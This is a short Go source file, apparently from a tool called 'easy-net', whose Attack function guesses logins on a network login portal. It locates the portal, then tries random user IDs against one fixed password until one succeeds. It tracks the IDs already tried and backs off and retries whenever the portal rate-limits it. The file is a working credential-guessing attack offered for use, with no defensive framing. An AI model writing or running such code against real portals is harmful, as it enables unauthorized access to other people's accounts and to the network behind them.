package auth

import (
	"errors"
	"fmt"
	"time"

	"nmnm.cc/easy-net/internal/log"
)

type AttackConfig struct {
	Host     string
	Base     string
	Link     string
	Password string
	Timeout  time.Duration
	// TargetSpeed string
}

var attackLogger = log.New("auth/attack")

func Attack(cfg *AttackConfig) error {
	tooFastCount := 0
	tried := make(map[string]struct{})

	for {
		userid := RandomUserid()

	TooFastRetry:

		if cfg.Base == "" {
			base, err := FindPortal(cfg.Host, cfg.Link)
			if err != nil {
				return fmt.Errorf("failed to find portal: %w", err)
			}
			cfg.Base = base
		}

		if _, ok := tried[userid]; ok {
			continue
		} else {
			tried[userid] = struct{}{}
		}

		if err := Login(&LoginConfig{
			Base:     cfg.Base,
			Link:     cfg.Link,
			UserID:   userid,
			Password: cfg.Password,
		}); err != nil {
			if errors.Is(err, ErrTooFast) {
				attackLogger.Warn("too fast, try again later")
				tooFastCount++
				time.Sleep(time.Duration(5*(tooFastCount+1)) * time.Second)
				goto TooFastRetry
			}

			tooFastCount = 0
			attackLogger.Warn("failed to login", "error", err)
			continue
		}

		break
	}

	return nil
}
